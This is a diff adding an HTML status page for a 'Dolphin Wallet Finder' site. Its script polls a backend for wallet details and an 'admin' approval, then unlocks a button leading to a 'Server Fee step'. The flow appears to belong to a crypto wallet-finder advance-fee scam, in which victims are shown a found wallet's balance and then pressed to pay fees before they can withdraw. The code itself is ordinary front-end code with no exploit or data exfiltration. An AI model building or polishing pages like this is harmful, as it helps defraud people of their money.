@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transaction Status — Dolphin Wallet Finder</title>
+  <style>
+  :root{
+    --c1:#0ff1e7; --c2:#35a7ff; --c3:#14ff89;
+    --grid:#0e1628;
+    --panel:rgba(10,16,26,.70); --panel2:rgba(6,12,20,.60);
+    --stroke:rgba(64,203,255,.28); --dash:rgba(32,205,255,.20);
+    --muted:rgba(190,245,255,.85); --text:#eafaff;
+    --shadow-lg:0 28px 90px rgba(0,0,0,.65);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0; color:var(--text);
+    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background:
+      radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
+      radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
+      linear-gradient(180deg,#0a1220,var(--grid) 42%);
+    overflow-x:hidden; -webkit-tap-highlight-color:transparent;
+  }
+
+  .radar{position:fixed; inset:0; z-index:-2}
+  canvas{position:absolute; inset:0; width:100%; height:100%}
+
+  .stage{min-height:100%; display:grid; place-items:center; padding:clamp(16px,3vw,32px); position:relative; z-index:2}
+  .shell{
+    width:min(1200px,98vw); min-height:560px; display:grid; grid-template-columns:1.05fr 1.45fr;
+    border-radius:28px; overflow:hidden; isolation:isolate; position:relative;
+    box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
+  }
+  @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
+
+  .brand-pane{
+    position:relative;
+    background:
+      radial-gradient(900px 600px at 20% 10%, rgba(53,167,255,.22), transparent 60%),
+      radial-gradient(700px 520px at 100% 100%, rgba(20,255,137,.20), transparent 65%),
+      linear-gradient(180deg, rgba(12,22,36,.88), rgba(8,16,28,.78));
+    backdrop-filter: blur(18px) saturate(120%);
+    border-right:1px solid rgba(64,203,255,.18);
+    overflow:hidden;
+  }
+  .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; justify-content:space-between }
+  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
+  .ring{ position:absolute; inset:-12%; border-radius:50%;
+    background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
+    filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
+  }
+  .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
+    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
+  .kicker{ color:var(--muted); line-height:1.8 }
+
+  .content-pane{ background:linear-gradient(180deg,var(--panel),var(--panel2)); backdrop-filter: blur(18px) saturate(120%); position:relative; }
+  .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
+  .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
+
+  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
+  .hero p{ color:var(--muted); line-height:1.9; margin:0 }
+
+  .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
+  @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
+  .card{ background:linear-gradient(110deg,rgba(0,255,255,.08),rgba(0,40,110,.13)); border:1px solid rgba(64,203,255,.28); border-radius:16px; padding:18px; display:flex; gap:10px; }
+
+  .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
+
+  .logo-wrap img{ width:100%; height:100%; object-fit:contain; display:block; }
+  @media (max-width: 600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
+
+  /* Bits */
+  .label{ color:var(--muted); font-size:.95rem }
+  .mono-box{
+    width:100%; padding:14px 16px; border-radius:14px;
+    background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10));
+    border:1px dashed var(--dash); color:var(--text); font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+    word-break:break-all
+  }
+  .actions{ margin-top:8px; display:flex; justify-content:center }
+  .btn{ border:none; border-radius:14px; padding:12px 18px; font-weight:800; letter-spacing:.3px; cursor:pointer; background:linear-gradient(95deg,var(--c2),var(--c1)); color:#001019; box-shadow:0 10px 28px rgba(53,167,255,.28); min-width:min(280px,90%); }
+  .btn[disabled]{ opacity:.5; filter:grayscale(.4); cursor:not-allowed }
+  .btn:hover:not([disabled]){ transform:translateY(-1px) }
+
+  @keyframes spin{ to{ transform:rotate(1turn) } }
+  </style>
+</head>
+<body>
+  <div class="radar" aria-hidden="true"></div>
+
+  <main class="stage">
+    <section class="shell" role="region" aria-label="Transaction Status Panel">
+
+      <!-- LEFT / BRAND -->
+      <aside class="brand-pane">
+        <div class="brand-inner">
+          <div>
+            <div class="logo-wrap" aria-hidden="true">
+              <div class="ring"></div>
+              <img src="../assets/logo.png" alt="Dolphin Wallet Logo" />
+            </div>
+            <h1 class="title">Dolphin Wallet</h1>
+            <p class="kicker">Transaction submitted. Status updates appear on the panel.</p>
+          </div>
+        </div>
+      </aside>
+
+      <!-- RIGHT / CONTENT -->
+      <section class="content-pane">
+        <div class="border-glow"></div>
+        <div class="pane-inner">
+
+          <header class="hero">
+            <h2>Transaction Submitted ✅</h2>
+            <p id="statusText">⏳ Awaiting admin confirmation...</p>
+          </header>
+
+          <div class="grid">
+            <div class="card" style="flex-direction:column">
+              <div class="label">Final Transaction Hash</div>
+              <div class="mono-box" id="txHash">Loading...</div>
+            </div>
+
+            <div class="card" style="flex-direction:column">
+              <div class="label">Wallet Information</div>
+              <div class="mono-box" id="walletInfo">Loading wallet data...</div>
+            </div>
+          </div>
+          <div class="actions">
+            <button class="btn" id="withdrawBtn" disabled>Proceed to Server</button>
+          </div>
+        </div>
+        <div class="foot">© 2025 DOLPHIN WALLET FINDER. All rights reserved.</div>
+      </section>
+    </section>
+  </main>
+
+<script>
+  const API_BASE_URL = "https://web-production-b86d.up.railway.app/api";
+  const token = sessionStorage.getItem("token") || localStorage.getItem("token");
+
+  if (!token) {
+    alert("Please log in first.");
+    window.location.href = "login.html";
+  }
+
+  function loadWalletData() {
+    fetch(`${API_BASE_URL}/my-wallet`, {
+      headers: { "Authorization": "Bearer " + token }
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (!data.wallet) {
+        alert("❌ No wallet found. Please scan first.");
+        window.location.href = "scan.html";
+        return;
+      }
+      const wallet = data.wallet;
+      const masked = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
+      document.getElementById("walletInfo").innerHTML = `
+        <strong>Address:</strong> ${masked}\n<br><strong>Balance:</strong> ${wallet.balance}\n<br><strong>Network:</strong> ${wallet.network}\n<br><strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
+      `;
+    })
+    .catch(() => alert("Error loading wallet data."));
+  }
+
+  function loadFinalTx() {
+    fetch(`${API_BASE_URL}/final-tx`, {
+      headers: { "Authorization": "Bearer " + token }
+    })
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById("txHash").innerText = data.tx_hash || "N/A";
+      const withdrawBtn = document.getElementById("withdrawBtn");
+
+      if (data.status === "approved") {
+        document.getElementById("statusText").innerHTML =
+          "✅ Transaction Approved! You can proceed to the Server Fee step.";
+        withdrawBtn.disabled = false;
+        withdrawBtn.onclick = () => { window.location.href = "server-fee.html"; };
+      } else if (data.status === "rejected") {
+        document.getElementById("statusText").innerHTML =
+          "❌ Your transaction was rejected by admin. Please contact support.";
+        withdrawBtn.disabled = true;
+        withdrawBtn.onclick = null;
+      } else {
+        document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
+        withdrawBtn.disabled = true;
+        withdrawBtn.onclick = null;
+      }
+    })
+    .catch(() => alert("Error loading transaction status."));
+  }
+
+  // Init
+  loadWalletData();
+  loadFinalTx();
+  const poll = setInterval(loadFinalTx, 5000);
+</script>
+</body>
+</html>
